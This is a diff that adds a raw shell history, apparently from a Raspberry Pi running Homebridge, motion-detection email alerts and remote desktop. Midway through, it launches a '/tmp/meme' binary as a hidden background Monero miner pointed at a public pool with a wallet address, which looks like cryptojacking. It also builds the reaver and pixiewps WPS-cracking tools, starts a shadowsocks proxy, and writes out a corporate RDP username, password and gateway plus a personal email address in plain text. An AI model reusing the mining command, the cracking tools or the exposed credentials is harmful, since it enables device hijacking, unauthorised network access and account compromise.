@@ -1,0 +1,628 @@
+rm -r node_modules
+ls
+npm install
+sudo node index_le.js start
+exit
+sudo pm2 list
+systemctl status homebrew
+ps
+top
+clear
+cd ~/apps/
+ls
+cd beacon-server/
+ls
+sudo npm start
+sudo node index_le.js start
+clear
+sudo node index.js start
+clear
+sudo node index.js start
+clear
+sudo node index_le.js start
+clear
+sudo node index.js start
+clear
+exit
+sudo apt-get update
+sudo apt-get upgrade
+sudo apt-get autoremove
+exit
+systemctl status homebridge
+systemctl stop homebridge
+sudo systemctl stop homebridge
+ls
+npm install -g homebridge-samsungtv2016
+sudo npm install -g homebridge-samsungtv2016
+ls
+cd /var/homebridge/
+ls
+nano config.json 
+systemctl status homebridge
+sudo systemctl status homebridge stop
+sudo systemctl stop homebridge
+systemctl status homebridge
+nano config.json 
+sudo systemctl start homebridge
+systemctl status homebridge
+systemctl stop  homebridge
+sudo systemctl stop homebridge
+nano config.json 
+ls -alF
+sudo systemctl stop homebridge
+sudo systemctl disable homebridge
+sudo systemctl daemon-reload 
+sudo systemctl enable homebridge
+sudo systemctl start homebridge
+systemctl status homebridge
+sudo systemctl stop homebridge
+systemctl start homebridge
+clear
+sudo systemctl start homebridge
+journalctl -u homebridge
+systemctl status homebridge
+clear
+homebridge
+npm rebuild -g homebridge
+homebridge
+npm install -g homebridge
+sudo npm install -g homebridge
+ls
+sudo systemctl stop homebridge
+sudo systemctl start homebridge
+systemctl status homebridge
+clear
+sudo npm install homebridge-wemo -g
+cd /var/homebridge/
+ls
+nano config.json 
+sudo systemctl stop homebridge
+ls -alF
+sudo nano config.json 
+sudo systemctl enable homebridge
+systemctl status homebridge
+sudo systemctl disable homebridge
+sudo systemctl enable homebridge
+sudo systemctl stop homebridge
+sudo systemctl start homebridge
+systemctl status homebridge
+top
+sudo pm2 list
+sudo systemctl status homebridge
+sudo systemctl stop homebridge
+sudo systemctl start homebridge
+sudo systemctl status  homebridge
+sudo journalctl homebridge
+sudo journalctl -l homebridge
+sudo journalctl 
+sudo systemctl status homebridge
+sudo systemctl stop homebridge
+nano /var/homebridge/config.json 
+sudo systemctl start homebridge
+sudo systemctl status homebridge
+cd ~/apps/alexa-control/
+ls
+nano myapi.js 
+open .
+sudo pm2 list
+systemctl status homebridge
+journalctl homebridgr
+journalctl homebridge
+journalctl ?
+journalctl
+systemctl
+systemctl stop homebridge
+sudo systemctl stop homebridge
+sudo systemctl start homebrdige
+sudo systemctl start homebridge
+systemctl status homebridge
+exit
+cd /var/homebridge/
+ls
+nano config.json 
+sudo service homebridge restart
+sudo systemctl status
+sudo systemctl homebridge restart
+sudo systemctl restart homebridge
+sudo systemctl status homebridge
+sudo systemctl status homebridge -l
+exit
+cd /tmp/
+ls
+top
+killall meme
+./meme
+cat bins.sh 
+sudo /etc/init.d/meme start
+sudo /etc/init.d/mem
+sudo /etc/init.d/meme
+cat /etc/init.d/meme
+cat /etc/init.d/
+cat /etc/init.d/meme
+./meme -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:3333 -u 464ntWJZ2umcetkJNbGRjfAqXpbdyizCMhq7kx6NmbACGssmFysmZo6YAsNojAfAeT1KNRVaaMeDETDtXQ2X4cFSFVVATVz -p x  &>/dev/null &
+killall meme
+./meme -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:3333 -u 464ntWJZ2umcetkJNbGRjfAqXpbdyizCMhq7kx6NmbACGssmFysmZo6YAsNojAfAeT1KNRVaaMeDETDtXQ2X4cFSFVVATVz -p x 
+./meme -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:3333 -u 464ntWJZ2umcetkJNbGRjfAqXpbdyizCMhq7kx6NmbACGssmFysmZo6YAsNojAfAeT1KNRVaaMeDETDtXQ2X4cFSFVVATVz -p x  &>/dev/null &
+ps2
+pm3
+pm2
+pm2 list
+pwd
+ls
+cd apps/
+ls
+cd alexa-control/
+ls
+pm2 start myapi.js
+exit
+ifconfig 
+su
+nano ~/apps/
+su
+sudo apt-get update
+sudo apt-get upgrade
+apt-get list
+su
+sudo apt-get -y install build-essential
+ls
+cd apps/
+ls
+wget https://github.com/wiire/pixiewps/archive/master.zip && unzip master.zip
+ls
+cd pixiewps*/
+cd src/
+make
+sudo make install
+cd ../..
+ls
+rm master.zip 
+wget https://github.com/t6x/reaver-wps-fork-t6x/archive/master.zip && unzip master.zip
+cd reaver-wps-fork-t6x*/
+cd src/
+./configure
+make
+sudo make install
+reaver
+cd ~
+su
+tightvncserver
+sudo tightvncserver
+sudo apt-get install tightvncserver
+tightvncserver
+sudo apt-get install python-pip python-gevent python-m2crypto
+sudo pip install shadowsocks
+sudo ssserver -p 443 -k 3031188 -m aes-256-cfb --user nobody -d start
+vncserver 
+vncserver -kill 1
+vncserver -kill :1
+vncserver
+vncpasswd
+exit
+crontab -e
+cd /tmp/
+ls
+sudo touch /tmp/motion.log
+sudo chmod 755 /tmp/motion.log
+ls
+cd ~
+mkdir ProgramFiles
+cd ProgramFiles/
+touch applogs.txt
+chmod 775 applogs.txt 
+sudo chmod 775 /tmp/motion.log 
+sudo chomod 775 applogs.txt 
+sudo chmod 775 applogs.txt 
+sudo cp /home/pi/Downloads/motion/* /etc/motion/
+cd /var/lib/motion/
+ls
+mkdir recordings
+sudo mkdir recordings
+sudo chmod 775 recordings
+sudo apt-get update
+sudo apt-get upgrade
+sudo apt-get install motion
+cd /etc/default
+ls
+sudo nano motion 
+cd ..
+ls
+cd motion/
+ls
+sudo nano motion.conf 
+sudo service motion start
+ps
+top
+clear
+nano /tmp/motion.log 
+sudo service motion stop
+cd /etc/motion/
+ls
+sudo chmod 775 *.ssh
+sudo chmod 775 *.sh
+sudo chmod 775 *.txt
+ls
+sudo nano motion.conf 
+sudo service motion start
+top
+clear
+sudo service motion stop
+sudo pm2 lisy
+sudo pm2 list
+sudo reboot
+vncserver
+exit
+top
+clear
+sudo service motion stop
+ssmtp
+sudo apt-get ssmtp
+sudo apt-get install ssmtp
+sudo apt-get install mailutils
+sudo nano /etc/ssmtp/ssmtp.conf 
+hostname
+ssmtp alexandre.babinos@gmail.com < /etc/motion/motion_detected_email.txt
+sudo nano /etc/ssmtp/ssmtp.conf 
+ssmtp alexandre.babinos@gmail.com < /etc/motion/motion_detected_email.txt
+sudo nano /etc/ssmtp/ssmtp.conf 
+ssmtp alexandre.babinos@gmail.com < /etc/motion/motion_detected_email.txt
+sudo nano /etc/ssmtp/ssmtp.conf 
+ssmtp alexandre.babinos@gmail.com < /etc/motion/motion_detected_email.txt
+top
+clear
+exit
+sudo service motion start
+exit
+top
+clear
+sudo service motion start
+top
+sudo reboot
+top
+nano /tmp/motion.log 
+cd /var/lib/
+ls -alF
+exit
+vncserver
+exit
+sudo service motion stop
+exit
+cd /etc/modprobe.d/
+ls
+reboot
+sudo apt-get update
+sudo apt-get upgrade
+reboot
+sudo snap install remmina
+cd ~/Downloads/rdesktop-1.6.0/
+./configure
+make
+./install-sh 
+ls
+./configure
+make
+make install
+cd ~
+cd .config/
+ls
+cd ~
+cd .remmina/
+nano 1507865752936.remmina 
+man remmina
+sudo apt-add-repository ppa:remmina-ppa-team/remmina-next
+sudo apt-get install software-properties-common python-software-properties
+sudo apt-add-repository ppa:remmina-ppa-team/remmina-next
+sudo apt-get update
+sudo apt-add-repository ppa:remmina-ppa-team/remmina-next
+sudo apt-get install remmina remmina-plugin-rdp libfreerdp-plugins-standard
+man xfreerdp 
+xfreerdp /v Jiamin-PC.redmond.corp.microsoft.com /bpp 32 /u REDMOND\jidi /p Djm@ms1710 /g Redmondts.microsoft.com /gu REDMOND\jidi /gp Djm@ms1710 /clipboard /sound:sys:alsa
+xfreerdp /v:Jiamin-PC.redmond.corp.microsoft.com /bpp:32 /u:REDMOND\jidi /p:Djm@ms1710 /g:Redmondts.microsoft.com /gu:REDMOND\jidi /gp:Djm@ms1710 /clipboard /sound:sys:alsa
+xfreerdp /v:Jiamin-PC.redmond.corp.microsoft.com /bpp:32 /u:REDMOND\jidi /p:Djm@ms1710 /g:Redmondts.microsoft.com /gu:REDMOND\jidi /gp:Djm@ms1710
+xfreerdp /v:Jiamin-PC.redmond.corp.microsoft.com /u:REDMOND\jidi /p:Djm@ms1710 /g:Redmondts.microsoft.com /gu:REDMOND\jidi /gp:Djm@ms1710
+man xfreerdp 
+xfreerdp /v:Jiamin-PC.redmond.corp.microsoft.com /u:jidi /p:Djm@ms1710 /d:REDMOND /g:Redmondts.microsoft.com /gu:REDMOND\jidi /gp:Djm@ms1710 /gd: REDMOND
+xfreerdp /v:Jiamin-PC.redmond.corp.microsoft.com /u:REDMOND\\jidi /p:Djm@ms1710 /d:REDMOND /g:Redmondts.microsoft.com /gu:REDMOND\\jidi /gp:Djm@ms1710 /gd: REDMOND
+xfreerdp /v:Jiamin-PC.redmond.corp.microsoft.com /u:REDMOND\\jidi /p:Djm@ms1710 /g:Redmondts.microsoft.com /gu:REDMOND\\jidi /gp:Djm@ms1710
+clear
+xfreerdp /v:Jiamin-PC.redmond.corp.microsoft.com /u:REDMOND\\jidi /p:Djm@ms1710 /g:Redmondts.microsoft.com /gu:REDMOND\\jidi /gp:Djm@ms1710
+xfreerdp /v:Jiamin-PC.redmond.corp.microsoft.com /u:REDMOND\\jidi /p:Djm@ms1710 /d:REDMOND /g:Redmondts.microsoft.com /gu:REDMOND\\jidi /gp:Djm@ms1710 /gd:REDMOND
+man xfreerdp 
+xfreerdp /v:Jiamin-PC.redmond.corp.microsoft.com /u:jidi@REDMOND /p:Djm@ms1710 /d:REDMOND /g:Redmondts.microsoft.com /gu:jidi@REDMOND /gp:Djm@ms1710 /gd:REDMOND
+xfreerdp /v:Jiamin-PC.redmond.corp.microsoft.com /u:jidi /p:Djm@ms1710 /d:REDMOND /g:Redmondts.microsoft.com /gu:jidi /gp:Djm@ms1710 /gd:REDMOND
+xfreerdp /v:Jiamin-PC.redmond.corp.microsoft.com /u:REDMOND\\jidi /p:Djm@ms1710 /d:REDMOND /g:Redmondts.microsoft.com /gu:REDMOND\\jidi /gp:Djm@ms1710 /gd:REDMOND
+ssh ding212@xinu01.cs.purdue.edu
+python3 /home/pi/Downloads/testtwitter.py 
+ps
+top
+pkill 2337
+kill -9 2337
+cd /var/lib/homebridge
+cd /var/lib/
+ls
+cd /home
+ls
+cd /var/lib/
+find ?
+man find
+cd /etc/default/
+ls
+cd ~/.homebridge/
+nano config.json
+cd ..
+cd /var/lib/
+find . -name config.json
+sudo find . -name config.json
+sudo find / -name config.json
+cd /
+cd ..
+sudo find . -name config.json
+nano /var/homebridge/config.json 
+cd /var/homebridge/
+cp config.json config.json.bk
+nano /var/homebridge/config.json 
+sudo apt-get update
+sudo apt-get upgrade
+Homebridge
+homebridge 
+sudo npm list
+sudo npm-ls
+npm list -g
+npm list -g --depth=0
+sudo npm uninstall homebridge-samsungtv2016
+sudo npm uninstall homebridge-samsungtv2016@0.0,4
+npm uninstall -g homebridge-samsungtv2016
+npm uninstall homebridge-samsungtv2016
+npm list -g --depth=0
+npm uninstall homebridge-nest
+sudo npm uninstall homebridge-nest
+npm list -g --depth=0
+sudo npm undate
+sudo npm update
+sudo npm upgrade
+cd ~/.homebridge/
+ls
+open .
+nano config.json 
+cp config.json config.json.bk
+nano config.json
+npm list -g --depth=0
+nano config.json
+systemctl status homebridge
+systemctl restart homebridge
+sudo systemctl restart homebridge
+systemctl status homebridge
+systemctl stop homebridge
+sudo systemctl stop homebridge
+systemctl status homebridge
+sudo systemctl start homebridge
+systemctl status homebridge
+homebridge
+sudo journalctl -au homebridge -n
+sudo journalctl -au homebridge
+sudo systemctl stop homebridge
+sudo systemctl start homebridge
+journalctl -au homebridge
+systemctl status homebridge
+journalctl -au homebridge
+nano config.json`
+nano config.json
+sudo systemctl stop homebridge
+sudo systemctl start homebridge
+journalctl -au homebridge
+journalctl -au homebridge -n
+cd /var/homebridge/
+nano config.json
+sudo systemctl status homebridge
+sudo systemctl stop homebridge
+nano /var/homebridge/config.json
+sudo systemctl start homebridge
+sudo systemctl status homebridge
+journalctl -au homebridge
+sudo systemctl status homebridge
+sudo systemctl status homebridge -n
+journalctl  homebridge
+man journalctl 
+sudo systemctl status homebridge -n
+sudo systemctl status homebridge
+systmctl status homebridge
+systemctl status homebridge
+journalctl -au homebridge
+sudo npm update -g homebridge
+systemctl status homebridge
+sudo npm update -g homebridge-wemo
+sudo journalctl -au homebridge
+sudo systemctl stop homebridge.service 
+nano /var/homebridge/config.json
+sudo systemctl start homebridge.service 
+sudo journalctl -au homebridge
+pwd
+ls
+cd apps/
+ls
+cd /
+pwd
+cd /var/lib/
+ls
+systemctl status homebridge
+cd /
+ls
+cd home/pi/.homebridge/
+ls
+open .
+npm list
+npm list -g
+npm install -g homebridge-nest
+systemctl stop homebridge
+sudo systemctl stop homebridge
+systemctl status homebridge
+sudo npm install -g homebridge-nest
+homebridge
+cd /
+find config.json
+find / -name "config.json"
+sudo find / -name "config.json"
+homebridge
+systemctl status homebridge
+jouralctl -u homebridge
+journalctl -u homebridge
+systemctl -l status homebridge
+journalctl homebridge
+journalctl -u homebridge
+sudo find / -name "config.json"
+cd /var/homebridge/
+ls
+nano config.json
+systemctl stop homebridge
+sudo systemctl stop homebridge
+nano config.json
+systemctl start homebridge
+reboot
+pwd
+cd /etc/
+find / config.json
+find / homebridge
+clear
+find / -type d -name "homebridge"
+sudo find / -type d -name "homebridge"
+sudo find / -type d -name homebridge
+cd /var/homebridge/
+ls
+nano config.json.bk 
+nano config.json
+systemctl stop homebridge
+sudo systemctl stop homebridge
+npm -g ls
+npm list -g
+npm uninstall homebridge-wemo
+npm uninstall homebridge-samsungtv
+node --version
+npm install -g homebridge-tplink-smarthome
+sudo npm install -g homebridge-tplink-smarthome
+nano config.json
+sudo systemctl start homebridge
+sudo systemctl status homebridge
+sudo find / config.json
+clear
+sudo find / -type d -name homebridge
+cd /usr/lib/node_modules/homebridge
+ls
+nano config-sample.json 
+cd /home/pi/.npm/homebridge
+ls
+sudo systemctl stop homebridge
+systemctl status homebridge
+homebridge
+cd /var/homebridge/
+nano config.json
+homebridge
+which homebridge
+cd /usr/bin/
+cd ~
+ls
+cd apps/
+ls
+cd ..
+cd node_modules/
+ls
+cd ..
+cd ProgramFiles/
+ls
+cd ..
+cd apps/
+ls
+cd ..
+cd ./.homebridge/
+ls
+rm config.json
+cp /var/homebridge/config.json ./
+ls
+nano config.json
+homebridge
+sudo systemctl start homebridge
+cd ~
+ls
+nano homebridge.txt
+systemctl status homebridge
+nano /var/homebridge/config.json
+sudo systemctl stop homebridge
+nano /var/homebridge/config.json
+cp /var/homebridge/config.json ~/.homebridge/
+homebridge
+sudo systemctl start homebridge
+sudo systemctl status homebridge
+cd /var/homebridge/
+nsno config.json
+nano config.json
+restart
+sudo reboot
+npm insall -g homebridge-yeelight
+npm install -g homebridge-yeelight
+sudo npm install -g homebridge-yeelight
+sudo systemctl restart homebridge
+sudo systemctl status homebridge
+exit
+sudo apt-get update
+sudo apt-get upgrade
+cd /etc/default/
+nano homebridge 
+cd /var/homebridge/
+ls
+rm config.json.bk 
+cp config.json config.json.bk
+sudo systemctl stop homebridge
+sudo npm install -g homebridge
+cp config.json ~/.homebridge/
+ls ~/.homebridge/
+sudo systemctl start homebridge
+systemctl status homebridge
+exit
+sudo poweroff
+pwd
+ls
+cd apps/
+ls
+cd ..
+sudo rm -rf LCD-show
+git clone https://github.com/goodtft/LCD-show.git
+chmod -R 755 LCD-show
+cd LCD-show/
+sudo ./LCD35-show
+ls /sys/class/backlight/
+pwd
+cd Desktop/
+ls
+cd ..
+ls
+nano homebridge.txt 
+sudo systemctl homebridge stop
+sudo systemctl stop homebridge
+npm install -g homebridge-sensibo-sky
+sudo npm install -g homebridge-sensibo-sky
+cd /var/homebridge/
+nano config.json
+sudo systemctl start homebridge
+systemctl status homebridge
+sudo systemctl stop homebridge
+nano config.json
+sudo systemctl start homebridge
+systemctl status homebridge
+nano config.json
+sudo systemctl stop homebridge
+sudo npm uninstall homebridge-sensibo-sky
+sudo npm uninstall-g  homebridge-sensibo-sky
+sudo npm uninstall -g homebridge-sensibo-sky
+nano config.json
+sudo npm install -g homebridge-sensibo
+nano config.json
+sudo systemctl start homebridge
+systemctl status homebridge
+nano config.json
+sudo systemctl stop homebridge
+sudo npm uninstall -g homebridge-tplink-smarthome
+sudo npm install -g homebridge-tplink-smarthome
+sudo systemctl start homebridge
+sudo reboot
+cd /var/homebridge/
+nano config.json
+systemctl status homebridge
+exit
